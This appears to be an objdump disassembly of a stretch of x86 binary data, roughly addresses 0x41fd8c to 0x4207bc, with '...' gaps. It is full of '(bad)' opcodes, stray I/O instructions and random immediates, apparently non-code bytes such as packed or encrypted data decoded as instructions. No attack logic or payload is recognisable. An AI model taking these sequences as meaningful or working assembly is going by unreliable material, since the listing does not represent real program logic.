  41fd8c:	mov    BYTE PTR [ebx],al
  41fd8e:	sbb    al,0x5b
  41fd90:	test   BYTE PTR [ebx],al
  41fd92:	dec    esp
  41fd93:	pop    ebx
  41fd94:	iret   
  41fd95:	add    ecx,DWORD PTR [eax+0x5b]
  41fd98:	rol    BYTE PTR [ebx],1
  41fd9a:	loopne 0x41fdf6
  41fd9c:	aam    0x3
  41fd9e:	sub    DWORD PTR [ebx-0x77],ebx
  41fda1:	add    esi,DWORD PTR [edx]
  41fda3:	pop    ebx
  41fda4:	mov    esi,0xb35b1503
  41fda9:	add    ebx,edi
  41fdab:	pop    edx
  41fdac:	dec    ebx
  41fdad:	add    al,0x9
  41fdaf:	pop    ebx
  41fdb0:	or     al,0x4
  41fdb2:	jmp    0xd461811
  41fdb7:	pop    ebx
  41fdb8:	(bad)  
  41fdba:	gs pop ebx
  41fdbc:	dec    edx
  41fdbd:	add    al,0x6c
  41fdbf:	pop    ebx
  41fdc0:	stc    
  41fdc1:	add    esi,DWORD PTR [ecx+0x5b]
  41fdc4:	add    cl,bh
  41fdc6:	cmp    eax,0x450067
	...
  41fdf3:	add    BYTE PTR [edx-0x47],al
  41fdf6:	add    BYTE PTR [eax],cl
  41fdf8:	cmp    ah,BYTE PTR [esi+0x0]
  41fdfb:	pop    es
  41fdfc:	inc    edx
  41fdfd:	data16 add cl,ch
  41fe00:	cmp    eax,0xec0a6790
  41fe05:	scas   eax,DWORD PTR es:[edi]
  41fe06:	jno    0x41fe1e
  41fe08:	fsubr  DWORD PTR [eax-0x512ae9a3]
  41fe0e:	inc    edi
  41fe0f:	pop    es
  41fe10:	fldcw  WORD PTR [eax-0x4ac23ca3]
  41fe16:	je     0x41fdf1
  41fe18:	pop    ss
  41fe19:	outs   dx,BYTE PTR ds:[esi]
  41fe1a:	sub    eax,0x66afeee9
  41fe1f:	(bad)  
  41fe21:	jge    0x41fe95
  41fe23:	les    ebx,FWORD PTR [ecx-0x60299ba3]
  41fe29:	mov    ecx,0xb19aaa5c
  41fe2e:	imul   eax,esi,0xffffff93
  41fe31:	sbb    al,0x52
  41fe33:	rcl    BYTE PTR [ecx-0x7073ae47],0xa6
  41fe3a:	arpl   WORD PTR [ebx-0x7fade372],bx
  41fe40:	mov    DWORD PTR [ecx-0x59907baf],edi
  41fe46:	arpl   WORD PTR [ebx+0x1d],di
  41fe49:	js     0x41feaf
  41fe4b:	popf   
  41fe4c:	jne    0x41fdfd
  41fe4e:	jno    0x41fecd
  41fe50:	cmp    eax,0x6075678a
  41fe55:	mov    esp,DWORD PTR [ebx+0x5b]
	...
  41fe80:	add    BYTE PTR [eax],al
  41fe82:	dec    esp
  41fe83:	mov    ecx,0xb71f0972
  41fe88:	pop    esp
  41fe89:	ds pop edi
  41fe8b:	mov    edx,0x1c265b53
  41fe90:	push   edx
  41fe91:	add    BYTE PTR [esi-0x7dac9dd5],cl
  41fe97:	and    eax,0x77656573
  41fe9c:	and    DWORD PTR [ebx+ecx*2+0x5],esp
  41fea0:	bound  ebp,QWORD PTR [ebp+0x28]
  41fea3:	sub    esp,DWORD PTR [edx+0x20]
  41fea6:	arpl   WORD PTR [esi],bp
  41fea8:	outs   dx,DWORD PTR ds:[esi]
  41fea9:	gs xor al,0x2b
  41feac:	ins    BYTE PTR es:[edi],dx
  41fead:	jb     0x41fefd
  41feaf:	push   edi
  41feb0:	dec    edi
  41feb1:	imul   esi,ebx,0xe565503a
  41feb7:	sub    DWORD PTR [edx+0x72],esp
  41feba:	idiv   DWORD PTR [edx+0x64]
  41febd:	sub    eax,0x72622432
  41fec2:	out    0x4,eax
  41fec4:	data16 je 0x41fec9
  41fec7:	add    eax,0x3ae17262
  41fecc:	outs   dx,DWORD PTR ds:[esi]
  41fecd:	and    BYTE PTR [edx+0x3b],al
  41fed0:	sub    dl,BYTE PTR [ebp-0xc]
  41fed3:	cmp    ch,BYTE PTR [edi+0x20]
  41fed6:	(bad)  
  41fed7:	or     ch,bh
  41fed9:	and    al,0xe4
  41fedb:	add    ecx,DWORD PTR [eax+0x65]
  41fede:	into   
  41fedf:	xor    al,0x65
  41fee1:	popa   
  41fee2:	scas   al,BYTE PTR es:[edi]
  41fee3:	xor    ebp,edi
  41fee5:	push   edx
	...
  41ff0e:	add    BYTE PTR [eax],al
  41ff10:	scas   al,BYTE PTR es:[edi]
  41ff11:	sub    esp,DWORD PTR [edx+0x53]
  41ff14:	mov    dl,0x25
  41ff16:	jae    0x41ff7d
  41ff18:	aad    0x77
  41ff1a:	and    DWORD PTR [ebx+ebx*4+0x4],esp
  41ff1e:	inc    ebx
  41ff1f:	push   esp
  41ff20:	(bad)  
  41ff21:	push   edi
  41ff22:	inc    esp
  41ff23:	gs mov ebx,0xa165752a
  41ff29:	or     ecx,DWORD PTR [ebp+0x0]
  41ff2c:	hlt    
  41ff2d:	sub    eax,0x70e46571
  41ff32:	js     0x41ffa1
  41ff34:	ds xchg esi,eax
  41ff36:	add    al,0x55
  41ff38:	mov    ds:0x9f4424a6,eax
  41ff3d:	pop    eax
  41ff3e:	jecxz  0x41ff3f
  41ff40:	jne    0x41feeb
  41ff42:	loope  0x41ffaa
  41ff44:	nop
  41ff45:	rcr    BYTE PTR fs:[esi-0x6e],0xa3
  41ff4a:	add    al,0x51
  41ff4c:	outs   dx,DWORD PTR ds:[esi]
  41ff4d:	push   eax
  41ff4e:	jmp    0x41ffc3
  41ff50:	mov    ds:0x8c6cdf24,eax
  41ff55:	pop    edi
  41ff56:	jecxz  0x41ffcb
  41ff58:	push   ds
  41ff59:	xor    eax,0x665f7401
  41ff5e:	call   0x16e3dc5
  41ff63:	daa    
  41ff64:	ds and al,0x1
  41ff67:	inc    ecx
  41ff68:	mov    DWORD PTR [edx-0x2b],edi
  41ff6b:	push   ebx
  41ff6c:	ins    BYTE PTR es:[edi],dx
  41ff6d:	ret    
  41ff6e:	retf   
  41ff6f:	dec    ebp
  41ff70:	jb     0x41ff76
  41ff72:	rcl    DWORD PTR [ecx+0x0],1
	...
  41ff9d:	add    BYTE PTR [edi-0x41],dh
  41ffa0:	ret    
  41ffa1:	push   ecx
  41ffa2:	pop    ss
  41ffa3:	add    al,0xd0
  41ffa5:	dec    ebp
  41ffa6:	pop    es
  41ffa7:	repz iret 
  41ffa9:	inc    edx
  41ffaa:	(bad)
  41ffae:	std    
  41ffaf:	mov    esp,0xf6094600
  41ffb4:	mov    edi,0xd1f946
  41ffb9:	add    BYTE PTR [edx],bl
  41ffbb:	jmp    0xf55266a1
  41ffc0:	add    BYTE PTR [ebp-0x14],ch
  41ffc3:	(bad)  
  41ffc5:	data16 loopne 0x41ff88
  41ffc8:	out    dx,eax
  41ffc9:	jno    0x41ffa5
  41ffcb:	add    esi,ecx
  41ffcd:	pop    esi
  41ffce:	in     eax,dx
  41ffcf:	xchg   esp,eax
  41ffd0:	repnz ins BYTE PTR es:[edi],dx
  41ffd2:	int3   
  41ffd3:	(bad)  
  41ffd5:	jne    0x41ffb6
  41ffd7:	pop    edx
  41ffd8:	push   ebx
  41ffd9:	out    dx,eax
  41ffda:	fcomp  QWORD PTR [edx+0x54]
  41ffdd:	cmc    
  41ffde:	fmul   QWORD PTR [ebp+eax*2+0x2e80a4e3]
  41ffe5:	repnz nop
  41ffe7:	xchg   DWORD PTR [edi+ebx*8],edi
  41ffea:	sub    DWORD PTR [eax+0x4a67f433],eax
  41fff0:	push   es
  41fff1:	add    al,0xa6
  41fff3:	(bad)  
  41fff4:	xor    esi,esp
  41fff6:	push   edi
  41fff7:	dec    edx
  41fff8:	(bad)  
  41fff9:	add    edx,DWORD PTR [esi-0x710bec71]
  41ffff:	push   ebp
  420000:	(bad)  
  420001:	sub    BYTE PTR [eax],al
	...
  42002b:	add    BYTE PTR [esi],bh
  42002d:	mov    bh,0x26
  42002f:	jmp    0xdf558296
  420034:	test   DWORD PTR [esi-0x77ad09f1],ebx
  42003a:	or     al,0x4
  42003c:	jp     0x41ffdc
  42003e:	push   ebp
  420040:	bound  ecx,QWORD PTR [eax+0x5b54eed0]
  420046:	mov    ebx,0xc68d59c4
  42004b:	out    0x1c,al
  42004d:	stos   DWORD PTR es:[edi],eax
  42004e:	mov    ebx,0x9a5b2eee
  420053:	call   0xe2f88f7b
  420058:	das    
  420059:	adc    BYTE PTR [ebx-0x4172de3c],0xe6
  420060:	sbb    al,0xab
  420062:	xchg   ebx,eax
  420063:	out    dx,al
  420064:	push   cs
  420065:	pop    ebx
  420066:	mov    al,0xe9
  420068:	push   cs
  420069:	(bad)
  42006d:	mov    ecx,0x5aefeaa3
  420072:	mov    ds:0x8c89efc5,eax
  420077:	jmp    0xa771:0xe90087ec
  42007e:	mov    ah,BYTE PTR [di-0x75]
  420082:	ins    DWORD PTR es:[edi],dx
  420083:	push   esp
  420084:	imul   ebx,DWORD PTR [ecx],0x84572a59
  42008a:	ins    DWORD PTR es:[edi],dx
  42008b:	dec    ebp
  42008c:	daa    
  42008d:	sbb    DWORD PTR [ecx+0x3b],ebx
	...
  4200b8:	add    BYTE PTR [eax],al
  4200ba:	daa    
  4200bb:	jl     0x420126
  4200bd:	xor    al,0x9
  4200bf:	test   DWORD PTR [ecx+ebp*8-0xe],esi
  4200c3:	inc    ebp
  4200c4:	dec    ebx
  4200c5:	dec    esp
  4200c6:	es jle 0x420136
  4200c9:	aas    
  4200ca:	cmp    dh,BYTE PTR [edi+0x7e00d449]
  4200d0:	ins    BYTE PTR es:[edi],dx
  4200d1:	add    al,0x17
  4200d3:	xchg   DWORD PTR [eax],eax
  4200d5:	xor    eax,0x76d8b12
  4200da:	in     eax,0x84
  4200dc:	arpl   dx,di
  4200de:	cmp    eax,0xdb10709c
  4200e3:	sbb    BYTE PTR [ecx+0x2c],bl
  4200e6:	rol    BYTE PTR [ecx-0x776ef29f],cl
  4200ec:	addr16 retf 0xaa3d
  4200f0:	je     0x4200ba
  4200f2:	fistp  QWORD PTR [esi+0x2b]
  4200f5:	scas   eax,DWORD PTR es:[edi]
  4200f6:	mov    DWORD PTR [eax-0x735b2600],ebp
  4200fc:	arpl   WORD PTR [edx-0x2f917fa9],di
  420102:	cmp    eax,0xa9c051b7
  420107:	jge    0x42017a
  420109:	jmp    0x9aa9af77
  42010e:	xchg   esp,eax
  42010f:	jnp    0x42017e
  420111:	mov    WORD PTR [ebp-0x5c],ds
  420114:	arpl   WORD PTR [ebp-0x40ff469c],cx
  42011a:	pop    edi
  42011b:	mov    WORD PTR [eax+0x0],?
	...
  420146:	add    BYTE PTR [eax],al
  420148:	push   edi
  420149:	das    
  42014a:	std    
  42014b:	fs push edi
  42014d:	or     ch,bh
  42014f:	jae    0x4201b8
  420151:	add    eax,0xfb676dfd
  420156:	cld    
  420157:	jb     0x4201b0
  420159:	pop    esp
  42015a:	add    BYTE PTR [eax+ebx*1+0x3],bl
  42015e:	ins    BYTE PTR es:[edi],dx
  42015f:	bound  eax,QWORD PTR [esi+0x70441d03]
  420165:	or     BYTE PTR [ebx+0x6c],ch
  420168:	nop
  420169:	(bad)  
  42016a:	pusha  
  42016b:	gs gs pop edi
  42016e:	dec    edi
  42016f:	dec    ebp
  420170:	inc    ecx
  420171:	(bad)  
  420172:	outs   dx,BYTE PTR ds:[esi]
  420173:	arpl   WORD PTR [edi+0x5f],di
  420176:	inc    esi
  420177:	jb     0x4201b3
  420179:	or     al,0x65
  42017b:	inc    esi
  42017c:	dec    ebx
  42017d:	das    
  42017e:	std    
  42017f:	sub    eax,0x432234
  420184:	and    eax,0x3a7a5e03
  420189:	fnstenv [eax+0x70]
  42018c:	xlat   BYTE PTR ds:[ebx]
  42018d:	or     al,0x66
  42018f:	je     0x4201db
  420191:	inc    ecx
  420192:	fs popa 
  420194:	retf   
  420195:	pop    ebx
  420196:	dec    esp
  420197:	popa   
  420198:	in     al,0x7
  42019a:	dec    ebp
  42019b:	popa   
  42019c:	in     al,0xc
  42019e:	je     0x42020f
  4201a0:	xchg   ebp,eax
  4201a1:	aaa    
  4201a2:	std    
  4201a3:	dec    ebx
  4201a4:	xchg   BYTE PTR [ecx+esi*2],cl
  4201a7:	inc    ecx
  4201a8:	jnp    0x4201e1
  4201aa:	outs   dx,DWORD PTR ds:[esi]
  4201ab:	add    BYTE PTR gs:[eax],al
	...
  4201d6:	in     al,0xc
  4201d8:	std    
  4201d9:	dec    ebx
  4201da:	xchg   BYTE PTR [ecx+esi*2],cl
  4201dd:	push   ebp
  4201de:	aam    0xfa
  4201e0:	outs   dx,BYTE PTR ds:[esi]
  4201e1:	add    bl,dl
  4201e3:	(bad)  
  4201e4:	outs   dx,DWORD PTR ds:[esi]
  4201e5:	je     0x4201ae
  4201e7:	add    BYTE PTR [edi+0x74],ch
  4201ea:	ds add dl,dl
  4201ed:	ins    BYTE PTR es:[edi],dx
  4201ee:	fsubr  st,st(5)
  4201f0:	in     eax,dx
  4201f1:	pop    esi
  4201f2:	in     al,dx
  4201f3:	out    0xd4,al
  4201f5:	inc    ebp
  4201f6:	shl    dl,cl
  4201f8:	icebp  
  4201f9:	addr16 out dx,al
  4201fb:	out    0xe3,al
  4201fd:	push   0x5ee4c3f2
  420202:	les    esp,FWORD PTR [esi+0x55ce73be]
  420208:	shl    DWORD PTR [edx-0x4e],1
  42020b:	mov    eax,0xb1996deb
  420210:	add    al,0x5c
  420212:	jl     0x4201c4
  420214:	jecxz  0x42028f
  420216:	fwait
  420217:	lock outs dx,DWORD PTR ds:[esi]
  42021a:	ds pop esi
  42021c:	fisubr WORD PTR [edi-0x5e]
  42021f:	add    al,0xbb
  420221:	push   ebx
  420222:	outs   dx,BYTE PTR ds:[esi]
  420223:	sub    DWORD PTR [edx],ebp
  420225:	cs jb  0x420293
  420228:	out    0x68,al
  42022a:	call   0xd518:0x6262ec71
  420231:	ins    BYTE PTR es:[edi],dx
  420232:	outs   dx,BYTE PTR ds:[esi]
  420233:	addr16 out 0x5b,al
  420236:	pop    ebp
  420237:	gs out 0x6a,eax
	...
  420262:	add    BYTE PTR [eax],al
  420264:	pop    edi
  420265:	pop    esi
  420266:	loopne 0x420267
  420268:	js     0x42027f
  42026a:	mov    ebx,0xc2046e53
  42026f:	ins    BYTE PTR es:[edi],dx
  420270:	push   eax
  420271:	es loopne 0x4202d4
  420274:	xor    bl,BYTE PTR [ebx]
  420276:	out    0x6d,al
  420278:	sub    eax,0x3277ed16
  42027d:	add    al,0x32
  42027f:	inc    esp
  420280:	push   ebx
  420281:	mov    esi,0xd13e4fcc
  420286:	jmp    0x4202fb
  420288:	sbb    edx,ecx
  42028a:	and    ah,BYTE PTR [edi+0x18]
  42028d:	pop    ebx
  42028e:	nop
  42028f:	add    esp,edx
  420291:	dec    ecx
  420292:	mov    ds:0xb7af0028,eax
  420297:	add    edx,DWORD PTR [edx]
  420299:	stos   BYTE PTR es:[edi],al
  42029a:	sub    bh,0xdc
  42029d:	sahf   
  42029e:	mov    edx,?
  4202a0:	fdivr  DWORD PTR [ebp-0x73]
  4202a3:	loopne 0x420274
  4202a5:	pop    edx
  4202a6:	call   0xefc4:0x96aefbc6
  4202ad:	lahf   
  4202ae:	inc    ebx
  4202af:	rcl    ebp,0x7b
  4202b2:	pop    edx
  4202b3:	icebp  
  4202b4:	pushf  
  4202b5:	mov    dh,BYTE PTR [ebx]
  4202b7:	shr    BYTE PTR [eax-0x5f37bb75],1
  4202bd:	jns    0x4202e2
  4202bf:	stc    
  4202c0:	jnp    0x420316
  4202c2:	imul   DWORD PTR [edi]
  4202c4:	dec    edi
  4202c5:	call   0x0:0x3bef
	...
  4202f0:	add    BYTE PTR [eax],al
  4202f2:	gs popf 
  4202f4:	cmc    
  4202f5:	mov    ebp,0x33d8484f
  4202fa:	push   ecx
  4202fb:	pushf  
  4202fc:	int3   
  4202fd:	ret    0x9a2e
  420300:	shl    BYTE PTR [esi],1
  420302:	cs push ebx
  420304:	xlat   BYTE PTR ds:[ebx]
  420305:	xor    ebp,DWORD PTR [ecx+ebx*4]
  420308:	mov    ecx,0x25542dbd
  42030d:	ret    0xb754
  420310:	mov    eax,0xb7b70c25
  420315:	xlat   BYTE PTR ds:[ebx]
  420316:	push   edx
  420317:	test   ch,dl
  420319:	xor    BYTE PTR [ebx+ebx*2],cl
  42031c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42031d:	loop   0x42034d
  42031f:	xchg   esp,eax
  420320:	lods   eax,DWORD PTR ds:[esi]
  420321:	iret   
  420322:	add    DWORD PTR [ebx-0x55],ebx
  420325:	lds    ebx,FWORD PTR [edi+ecx*4]
  420328:	call   0x99dc:0xcd7c2fe2
  42032f:	inc    edi
  420330:	add    BYTE PTR [ecx-0xff7a8d],dh
  420336:	(bad)  
  420337:	jns    0x4203a9
  420339:	jmp    0xac949baf
  42033e:	mov    gs,WORD PTR [ebx+0x5b27c656]
  420344:	jo     0x4202ce
  420346:	outs   dx,BYTE PTR ds:[esi]
  420347:	mov    dh,BYTE PTR [ebp-0x6a]
  42034a:	outs   dx,DWORD PTR ds:[esi]
  42034b:	jns    0x42036d
  42034d:	mov    ah,0xc
  42034f:	push   ecx
  420350:	bound  esi,QWORD PTR [ebx-0x7b8e75c3]
	...
  42037e:	add    BYTE PTR [eax],al
  420380:	dec    edi
  420381:	xchg   DWORD PTR [edi+0x54],ebx
  420384:	popa   
  420385:	push   ebx
  420386:	jno    0x4203ab
  420388:	inc    edx
  420389:	jge    0x4203fe
  42038b:	inc    ebp
  42038c:	es jne 0x4203ee
  42038f:	inc    ebp
  420390:	push   ds
  420391:	mov    esp,DWORD PTR [ebx+0x3a]
  420394:	das    
  420395:	push   ebx
  420396:	jno    0x42039b
  420398:	inc    edx
  420399:	inc    ebp
  42039a:	add    BYTE PTR ds:0x1a4baad1,bl
  4203a0:	in     al,dx
  4203a1:	scas   al,BYTE PTR es:[edi]
  4203a2:	sub    eax,0x50a8c3e9
  4203a7:	leave  
  4203a8:	add    ecx,DWORD PTR [eax-0x574c168b]
  4203ae:	push   eax
  4203af:	pop    ds
  4203b0:	jecxz  0x420341
  4203b2:	add    dl,bh
  4203b4:	aam    0x88
  4203b6:	arpl   dx,di
  4203b8:	and    edx,DWORD PTR [ebx-0x55c5fa95]
  4203be:	dec    ebp
  4203bf:	daa    
  4203c0:	out    dx,al
  4203c1:	scas   eax,DWORD PTR es:[edi]
  4203c2:	aas    
  4203c3:	mov    ebx,0xce52b080
  4203c8:	lahf   
  4203c9:	xchg   DWORD PTR [ebx],ebp
  4203cb:	scas   eax,DWORD PTR es:[edi]
  4203cc:	and    DWORD PTR [eax+eiz*1+0x5c4e601a],0x6efbc400
  4203d7:	imul   edx,edi,0xb4007004
  4203dd:	pop    ds
  4203de:	inc    ebx
  4203df:	push   esp
  4203e0:	mov    al,0x19
  4203e2:	dec    edi
  4203e3:	inc    ebp
	...
  42040c:	add    BYTE PTR [eax],al
  42040e:	jnp    0x42043a
  420410:	ins    BYTE PTR es:[edi],dx
  420411:	(bad)  
  420412:	enter  0x463d,0x54
  420416:	mov    bh,0x38
  420418:	das    
  420419:	cs nop
  42041b:	sub    al,0x43
  42041d:	push   esp
  42041e:	(bad)  
  42041f:	sub    esp,DWORD PTR [edx+0x72]
  420422:	shl    DWORD PTR [edi+ebp*2],1
  420425:	jae    0x42048e
  420427:	(bad)  
  420428:	push   eax
  420429:	push   eax
  42042a:	ja     0x420447
  42042c:	ins    BYTE PTR es:[edi],dx
  42042d:	jne    0x420418
  42042f:	adc    bh,ch
  420431:	inc    ebp
  420432:	jae    0x420463
  420434:	sbb    eax,0x61fb7e46
  420439:	and    eax,0x61505f83
  42043e:	fs or  al,0x74
  420441:	outs   dx,DWORD PTR ds:[esi]
  420442:	push   ebp
  420443:	add    edi,ebp
  420445:	push   edx
  420446:	or     BYTE PTR ds:0x19456573,0x5e
  42044d:	ins    DWORD PTR es:[edi],dx
  42044e:	xor    bl,BYTE PTR [edi+0x51]
  420451:	jae    0x420495
  420453:	or     eax,0xd6e74446
  420458:	push   0x69
  42045a:	push   ebx
  42045b:	ss pop esi
  42045d:	ins    BYTE PTR es:[edi],dx
  42045e:	adc    esi,DWORD PTR [esi]
  420460:	outs   dx,DWORD PTR ds:[esi]
  420461:	gs inc esp
  420463:	adc    ebp,DWORD PTR [edx+esi*2-0x32]
  420467:	push   edi
  420468:	push   eax
  420469:	outs   dx,DWORD PTR ds:[esi]
  42046a:	lds    ecx,FWORD PTR [ebx]
  42046c:	dec    ebx
  42046d:	jne    0x420459
  42046f:	std    
  420470:	popa   
  420471:	jb     0x420473
	...
  42049b:	add    BYTE PTR [edi+0x3e72622c],ah
  4204a1:	xor    al,0xe8
  4204a3:	jno    0x4204b7
  4204a5:	sub    esi,ecx
  4204a7:	bound  edi,QWORD PTR [esi]
  4204a9:	xor    al,BYTE PTR [ecx]
  4204ab:	add    BYTE PTR [esi],bh
  4204ad:	rcr    al,cl
  4204af:	ds ds sbb al,ch
  4204b3:	mov    cs,WORD PTR [ebx]
  4204b5:	or     ecx,0x4b
  4204b8:	push   ecx
  4204b9:	mov    ah,0x4b
  4204bb:	add    eax,0xd167399e
  4204c0:	fdivr  DWORD PTR [esi-0x2bd00035]
  4204c6:	aaa    
  4204c7:	cs sub al,0x1b
  4204ca:	pop    ds
  4204cb:	xor    DWORD PTR [ecx],edx
  4204cd:	add    dh,BYTE PTR [ecx]
  4204cf:	or     bh,BYTE PTR [eax]
  4204d1:	cli    
  4204d2:	sbb    eax,0x7ff3f06
  4204d7:	add    eax,0x5101013d
  4204dc:	test   eax,0x9f74f89a
  4204e1:	mov    dh,0xe7
  4204e3:	pop    ebx
  4204e4:	jp     0x420481
  4204e6:	loop   0x420546
  4204e8:	lods   eax,DWORD PTR ds:[esi]
  4204e9:	inc    edx
  4204ea:	fmul   DWORD PTR [edi+0x7a]
  4204ed:	jne    0x4204ca
  4204ef:	jae    0x42048c
  4204f1:	fs mov edi,0xe9a3985e
  4204f7:	bound  ecx,QWORD PTR [esp+eax*1+0x686d6cb9]
  4204fe:	add    al,0x53
	...
  420528:	add    BYTE PTR [eax],al
  42052a:	ins    DWORD PTR es:[edi],dx
  42052b:	pop    edi
  42052c:	idiv   bh
  42052e:	jns    0x420593
  420530:	cmc    
  420531:	jo     0x420571
  420533:	je     0x420516
  420535:	jno    0x420589
  420537:	add    al,0xd3
  420539:	bound  esp,QWORD PTR [ebx+0x59]
  42053c:	clc    
  42053d:	bound  ebx,QWORD PTR [esi]
  42053f:	cmp    bl,bl
  420541:	jno    0x420581
  420543:	pop    ebx
  420544:	ret    
  420545:	(bad)  
  420546:	xor    BYTE PTR [ebp-0x3c],bh
  420549:	cmc    
  42054a:	sbb    eax,0xa9deca88
  42054f:	inc    eax
  420550:	ret    
  420551:	clc    
  420552:	push   ds
  420553:	xchg   bh,ah
  420555:	clc    
  420556:	push   cs
  420557:	js     0x420512
  420559:	and    DWORD PTR [edi],ebx
  42055b:	add    ch,0xe9
  42055e:	and    BYTE PTR [edx-0x19],bh
  420561:	das    
  420562:	vmread DWORD PTR [ebx-0x797f1f09],ebx
  420569:	and    esp,eax
  42056b:	jnp    0x4204f1
  42056d:	call   0x26294296
  420572:	mov    DWORD PTR ds:[eax-0x43883321],ecx
  420579:	and    eax,0xe986ae3e
  42057e:	int    0x89
  420580:	mov    ch,dh
  420582:	fsubr  QWORD PTR [esi-0x7d5b24c6]
  420588:	dec    ebp
  420589:	fcom   DWORD PTR [eax+0xe33f87]
	...
  4205b7:	add    BYTE PTR [edi+ebp*4-0x587208c9],dl
  4205be:	and    al,dl
  4205c0:	outs   dx,BYTE PTR ds:[esi]
  4205c1:	js     0x4205fd
  4205c3:	cmc    
  4205c4:	cwde   
  4205c5:	add    BYTE PTR [ebp-0xb],0x9
  4205c9:	call   0xdf08:0xa18df53e
  4205d0:	pop    esp
  4205d1:	pop    ebx
  4205d2:	xor    al,0xf5
  4205d4:	pop    esp
  4205d5:	lea    esp,ds:0xe77854e3
  4205db:	rol    DWORD PTR [eax+0x6af8fa8e],cl
  4205e1:	lea    eax,[ebx]
  4205e3:	add    al,0x6e
  4205e5:	add    BYTE PTR [eax],0xfb
  4205e8:	rcr    DWORD PTR [edi+0x7cdbfc73],1
  4205ee:	jb     0x4205d9
  4205f0:	xchg   ecx,eax
  4205f1:	jl     0x420665
  4205f3:	int3   
  4205f4:	xchg   esp,eax
  4205f5:	jg     0x420656
  4205f7:	lds    edx,FWORD PTR [ecx+0x3dc47088]
  4205fd:	mov    eax,ds:0xad87b970
  420602:	push   eax
  420603:	cpuid  
  420605:	test   BYTE PTR [ecx+ebp*8+0x79],ch
  420609:	lahf   
  42060a:	ins    DWORD PTR es:[edi],dx
  42060b:	mov    ch,0x98
  42060d:	sbb    DWORD PTR [edi-0x73],0xba00445a
  420614:	pop    esi
  420615:	ja     0x42068b
  420617:	sahf   
  420618:	pop    esp
  420619:	mov    esp,DWORD PTR [ebx-0x53]
	...
  420644:	add    BYTE PTR [eax],al
  420646:	jp     0x4206c6
  420648:	data16 (bad) 
  42064a:	pusha  
  42064b:	jl     0x42068e
  42064d:	je     0x42069c
  42064f:	jno    0x4206a2
  420651:	xchg   BYTE PTR [edi-0x73],dl
  420654:	jne    0x4205de
  420656:	dec    ebx
  420657:	jl     0x420659
  420659:	das    
  42065a:	push   ss
  42065b:	mov    eax,ds:0x8c194520
  420660:	je     0x4206a2
  420662:	sbb    al,0xb2
  420664:	je     0x4206a6
  420666:	pop    ds
  420667:	jg     0x420689
  420669:	cmp    ah,BYTE PTR [ecx]
  42066b:	mov    esi,DWORD PTR [esi+0x44]
  42066e:	or     BYTE PTR [ecx],dl
  420670:	inc    ebx
  420671:	sbb    eax,0x446470f2
  420676:	or     ecx,DWORD PTR [ebp-0x7322e899]
  42067c:	addr16 push cs
  42067e:	fdiv   QWORD PTR [eax+0x73]
  420681:	sbb    ah,cl
  420683:	mov    al,BYTE PTR [eax]
  420685:	daa    
  420686:	push   es
  420687:	mov    eax,ds:0xf84b0020
  42068c:	outs   dx,DWORD PTR ds:[esi]
  42068d:	je     0x4206bd
  42068f:	std    
  420690:	pop    ebp
  420691:	je     0x4206d1
  420693:	cli    
  420694:	push   0x20
  420696:	(bad)  
  420697:	std    
  420698:	outs   dx,DWORD PTR ds:[esi]
  420699:	jae    0x420633
  42069b:	sti    
  42069c:	outs   dx,BYTE PTR ds:[esi]
  42069d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42069f:	and    dl,BYTE PTR [ecx+0x50]
  4206a2:	aaa    
  4206a3:	add    esp,DWORD PTR [edx+0x73]
  4206a6:	mov    esi,DWORD PTR ds:0x616b
	...
  4206d4:	(bad)  ds:0x7476e6c
  4206da:	ins    BYTE PTR es:[edi],dx
  4206db:	jb     0x4206a8
  4206dd:	pop    esp
  4206de:	inc    esi
  4206df:	push   esp
  4206e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206e1:	cmp    al,0x64
  4206e3:	gs aam 0x8
  4206e6:	data16 outs dx,BYTE PTR ds:[esi]
  4206e8:	(bad)  
  4206e9:	or     BYTE PTR [esi+0x6f],ah
  4206ec:	sar    DWORD PTR [edi+ebx*2],0x61
  4206f0:	retf   
  4206f1:	std    
  4206f2:	push   0x465cc86f
  4206f7:	push   esp
  4206f8:	mov    bh,0x3c
  4206fa:	jo     0x42076e
  4206fc:	rol    BYTE PTR [edx],0x66
  4206ff:	ins    BYTE PTR es:[edi],dx
  420700:	mov    edx,0x7b45fd07
  420705:	daa    
  420706:	push   eax
  420707:	push   0x68fb7a
  42070c:	jns    0x420721
  42070e:	ins    DWORD PTR es:[edi],dx
  42070f:	jae    0x420790
  420711:	add    ch,BYTE PTR [ecx+0x6c]
  420714:	xor    ecx,edi
  420716:	outs   dx,DWORD PTR ds:[esi]
  420717:	imul   esp,DWORD PTR [edi],0x4b666c2d
  42071d:	or     BYTE PTR [esi+0x72],bl
  420720:	jp     0x42074d
  420722:	dec    edx
  420723:	inc    ecx
  420724:	xor    al,0x3a
  420726:	dec    edi
  420727:	outs   dx,DWORD PTR ds:[esi]
  420728:	cmp    DWORD PTR [ebx],edx
  42072a:	pop    ecx
  42072b:	inc    esi
  42072c:	ds dec esi
  42072e:	aam    0x46
  420730:	push   eax
  420731:	pop    eax
  420732:	fstp   QWORD PTR [ebx+0x6d]
  420735:	pop    edi
  420736:	clc    
  420737:	jb     0x420739
	...
  420761:	add    BYTE PTR [esi+0x2],cl
  420764:	lds    ebx,FWORD PTR [esi+0x52]
  420767:	arpl   ax,cx
  420769:	dec    sp
  42076b:	add    cl,ch
  42076d:	inc    ebp
  42076e:	adc    dl,dl
  420770:	mov    ebx,0x121186d
  420775:	push   ecx
  420776:	and    esi,DWORD PTR [ebx+esi*8]
  420779:	bound  ebp,QWORD PTR [esi+ebp*8]
  42077c:	(bad)  [eax+0x12]
  42077f:	push   0x2226aec
  420784:	mov    ebx,0xf1cf0662
  420789:	inc    ebp
  42078a:	pop    ss
  42078b:	into   
  42078c:	out    0xff,eax
  42078e:	jecxz  0x42077d
  420790:	lock jo 0x42077a
  420793:	in     eax,0xe7
  420795:	sub    eax,0xffdbd7d7
  42079a:	sti    
  42079b:	loop   0x42078e
  42079d:	jae    0x42078c
  42079f:	(bad)  
  4207a0:	fisubr WORD PTR [ebp-0x25]
  4207a3:	and    DWORD PTR [edi-0xd6f268f],edi
  4207a9:	(bad)  
  4207aa:	int3   
  4207ab:	add    ebx,eax
  4207ad:	push   ebx
  4207ae:	mov    cs,WORD PTR [eax-0x25]
  4207b1:	jo     0x42075d
  4207b3:	pop    esi
  4207b4:	call   0xbf8a461a
  4207b9:	pop    esi
  4207ba:	scas   al,BYTE PTR es:[edi]
  4207bb:	push   eax
  4207bc:	out    0x50,eax
